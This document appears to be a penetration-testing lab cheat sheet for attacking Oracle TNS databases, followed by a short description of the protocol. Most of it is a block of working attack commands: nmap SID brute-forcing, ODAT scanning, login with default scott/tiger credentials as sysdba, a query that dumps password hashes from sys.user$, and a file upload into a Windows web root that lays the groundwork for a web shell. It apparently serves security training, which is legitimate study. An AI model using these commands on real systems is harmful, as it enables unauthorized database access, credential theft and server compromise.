```
#Footprinting
sudo nmap -p1521 -sV 10.129.204.235 --open

#Nmap - SID Bruteforcing
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

#ODAT - scans oracle databases
./odat.py all -s 10.129.204.235

#SQLPlus login
sqlplus scott/tiger@10.129.204.235/XE

#SQLPlus fix
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

#Oracle RDBMS - Database Enumeration
sqlplus scott/tiger@10.129.204.235/XE as sysdba

#Oracle RDBMS - Extract Password Hashes
SQL> select name, password from sys.user$;

#Oracle RDBMS - File Upload
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```




The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.